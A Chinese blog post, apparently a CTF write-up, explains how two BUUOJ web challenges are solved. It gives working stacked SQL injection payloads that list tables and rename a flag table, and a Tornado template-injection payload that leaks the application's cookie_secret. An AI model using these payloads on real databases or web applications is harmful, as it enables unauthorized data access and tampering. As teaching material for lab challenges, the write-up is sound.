@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Buuoj|[强网杯2019]随便注、[护网杯 2018]easy_tornado | Rinlang</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="0x01 [强网杯2019]随便注 知识要点 SQL堆叠注入  一些精妙的思路   ·思路随便提交一个参数，得到回显，输入的参数以URL参数的形式传入http:&#x2F;&#x2F;bae67c64-10af-4353-a896-24763719a200.node3.buuoj.cn&#x2F;?inject&#x3D;1，需要判断一下注入点的存在与否和注入点的类型。 先试着输入1&#39;,直接报错  error 1064 : Y">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buuoj|[强网杯2019]随便注、[护网杯 2018]easy_tornado">
+<meta property="og:url" content="http://r4u.top/2020/04/01/Buuoj-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/index.html">
+<meta property="og:site_name" content="Rinlang">
+<meta property="og:description" content="0x01 [强网杯2019]随便注 知识要点 SQL堆叠注入  一些精妙的思路   ·思路随便提交一个参数，得到回显，输入的参数以URL参数的形式传入http:&#x2F;&#x2F;bae67c64-10af-4353-a896-24763719a200.node3.buuoj.cn&#x2F;?inject&#x3D;1，需要判断一下注入点的存在与否和注入点的类型。 先试着输入1&#39;,直接报错  error 1064 : Y">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-04-01T17:52:50.000Z">
+<meta property="article:modified_time" content="2022-01-03T17:17:25.991Z">
+<meta property="article:author" content="Rinlang">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="buuoj">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Rinlang" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Rinlang</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://r4u.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Buuoj-强网杯2019-随便注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/04/01/Buuoj-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="article-date">
+  <time class="dt-published" datetime="2020-04-01T17:52:50.000Z" itemprop="datePublished">2020-04-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Buuoj|[强网杯2019]随便注、[护网杯 2018]easy_tornado
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<h2 id="0x01-强网杯2019-随便注"><a href="#0x01-强网杯2019-随便注" class="headerlink" title="0x01 [强网杯2019]随便注"></a>0x01 [强网杯2019]随便注</h2></blockquote>
+<h3 id="知识要点"><a href="#知识要点" class="headerlink" title="知识要点"></a>知识要点</h3><ul>
+<li><p>SQL堆叠注入</p>
+</li>
+<li><p>一些<strong>精妙</strong>的思路</p>
+</li>
+</ul>
+<h3 id="·思路"><a href="#·思路" class="headerlink" title="·思路"></a>·思路</h3><p>随便提交一个参数，得到回显，输入的参数以URL参数的形式传入<code>http://bae67c64-10af-4353-a896-24763719a200.node3.buuoj.cn/?inject=1</code>，需要判断一下注入点的存在与否和注入点的类型。</p>
+<p>先试着输入<code>1&#39;</code>,直接报错</p>
+<blockquote>
+<p><code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code></p>
+</blockquote>
+<p>当再次输入<code>1&#39;#</code>,没有报错正常显示，说明后端存在数据库查询且我们的输入能够影响到数据库查询，直接尝试进行union注入，但是得到提示</p>
+<blockquote>
+<p><code>return preg_match(&quot;/select|update|delete|drop|insert|where|./i&quot;,$inject);</code></p>
+</blockquote>
+<p>输入会被大小写不敏感地检测并屏蔽。也许可以考虑绕过，但是对于语句本身的绕过小技巧基本没什么作用，对于url传入数组让<code>preg_match</code>返回NULL的无谓尝试也会被报错返回。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Warning:  preg_match() expects parameter 2 to be string, array given in /var/www/html/index.php on line 19</span><br></pre></td></tr></table></figure>
+
+<p>只能考虑不使用被屏蔽的sql关键字来进行注入，这时候可以微妙的发现<code>show</code>和一些<code>DML</code>语句并没有被屏蔽，于是考虑到堆叠注入（这个心路历程是我猜的，我也不知道出题人有没有提示)</p>
+<p>先用<code>SHOW</code>和<code>DESC</code>语句将表名和表的结构弄清楚</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">payload:<span class="number">1</span><span class="string">&#x27;;show tables;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">payload:1&#x27;</span>;<span class="keyword">desc</span> words;#</span><br><span class="line"></span><br><span class="line">payload:<span class="number">1</span><span class="string">&#x27;;desc `1919810931114514`;# //这里因为表名是一串纯数字,所以要记得用反引号括起来</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1919810931114514(</span></span><br><span class="line"><span class="string">  flag varchar(100)</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">words(</span></span><br><span class="line"><span class="string">  id int(10)</span></span><br><span class="line"><span class="string">  data varchar(20)</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>但是只是用show没法看到flag。可以考虑换种思路,把含有flag的表添加一行id，然后将这个表改名为words，而将words表改成其他名字，这样前端查询出来的就是含有flag的表的内容。<br>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;alter table `1919810931114514` add id int(10) not null primary key auto_increment;alter table `1919810931114514` change flag data varchar(100);rename table words to words1;rename table `1919810931114514` to words;#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<h2 id="0x02-护网杯-2018-easy-tornado"><a href="#0x02-护网杯-2018-easy-tornado" class="headerlink" title="0x02 [护网杯 2018]easy_tornado"></a>0x02 [护网杯 2018]easy_tornado</h2></blockquote>
+<h3 id="知识要点-1"><a href="#知识要点-1" class="headerlink" title="知识要点"></a>知识要点</h3><ul>
+<li><p>SSTI服务器模板注入</p>
+</li>
+<li><p>Python tornado web框架</p>
+</li>
+</ul>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目中有提示是<code>tornado</code>框架编写的<code>python</code>应用</p>
+<p>先交互一下看看网站功能,一上来给了三个文件  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/flag.txt</span><br><span class="line">/welcome.txt</span><br><span class="line">/hints.txt</span><br></pre></td></tr></table></figure>
+
+<p>访问一下发现访问的方式都是由file路由提供的,需要提供参数<code>filename</code>和<code>filehash</code>,在hints.txt中了解到<code>filehash = md5(cookie_secret+md5(filename))</code>,又在flag.txt中了解到flag在文件<code>/fllllllllllllag</code>中  </p>
+<p>当我们不提供filehash参数或者随便提供一个错误的hash值时,会自动跳转到<code>http://e0cf92bb-4eec-4b46-aef3-7c594de3e4ee.node3.buuoj.cn/error?msg=Error</code>并且前端打印出<code>Error</code>  </p>
+<p>对于我们每一个能够控制的参数都检查试试,发现我们可控的msg参数会打印在前端  </p>
+<p>由于tornado的前后端交互使用的是模板引擎,所以可以考虑一下服务器端的模板注入,可以构建一个填充表达式来尝试验证是否存在注入</p>
+<p><code>?msg=&#123;&#123;1&#125;&#125;</code>,前端回显1,证实存在模板注入</p>
+<p>需要知道的一点是,<code>cookie_secret</code>是tornado框架中Application对象的setting数组的一个可设置项,具体可以参考<a target="_blank" rel="noopener" href="https://www.tornadoweb.org/en/stable/web.html?highlight=settings#tornado.web.Application.settings">tornado.web — RequestHandler and Application classes — Tornado 6.0.4 documentation</a></p>
+<p>然而在如何使用settings字典时卡住了,网上的师傅们给的解释是</p>
+<p>`handler 指向RequestHandler</p>
+<p>而RequestHandler.settings又指向self.application.settings</p>
+<p>所有handler.settings就指向RequestHandler.application.settings了`</p>
+<p>指定参数<code>msg=&#123;&#123;handler.settings&#125;&#125;</code>,得到cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;877a5add-44e4-414c-8600-36b9a5cf61b3&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进行hash之后,输入参数访问,得到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://r4u.top/2020/04/01/Buuoj-%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" data-id="ckxyy4hie00048xnifnbwh7q9" data-title="Buuoj|[强网杯2019]随便注、[护网杯 2018]easy_tornado" class="article-share-link">分享</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/04/12/%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0-%E5%88%A9%E7%94%A8LD-PRELOAD%E8%BF%9B%E8%A1%8C%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-functions/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          思路复现|利用LD_PRELOAD进行函数劫持绕过disable_functions
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2019/12/27/Buuoj-AreUSerialz-0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">Buuoj|AreUSerialz</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/buuoj/" rel="tag">buuoj</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%B8%AA%E4%BA%BA%E5%BF%83%E5%BE%97/" rel="tag">个人心得</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0/" rel="tag">思路复现</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/buuoj/" style="font-size: 20px;">buuoj</a> <a href="/tags/ctf/" style="font-size: 20px;">ctf</a> <a href="/tags/%E4%B8%AA%E4%BA%BA%E5%BF%83%E5%BE%97/" style="font-size: 10px;">个人心得</a> <a href="/tags/%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">思路复现</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 10px;">漏洞复现</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">十月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">八月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/10/12/%E8%B0%88%E8%B0%88%E5%BF%83%E5%BE%97-%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%8C%87%E5%BC%95%E5%8F%8A%E8%B5%84%E6%BA%90%E6%B1%87%E6%80%BB/">谈谈心得|计算机安全学习指引及资源汇总</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/01/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell/">漏洞复现|Typecho反序列化漏洞getshell</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/22/Buuoj-%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-notes/">Buuoj|[网鼎杯2020 青龙组]notes</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/16/Buuoj-MRCTF2020-Ezpop/">Buuoj|[MRCTF2020]Ezpop</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/12/%E6%80%9D%E8%B7%AF%E5%A4%8D%E7%8E%B0-%E5%88%A9%E7%94%A8LD-PRELOAD%E8%BF%9B%E8%A1%8C%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81%E7%BB%95%E8%BF%87disable-functions/">思路复现|利用LD_PRELOAD进行函数劫持绕过disable_functions</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 Rinlang<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
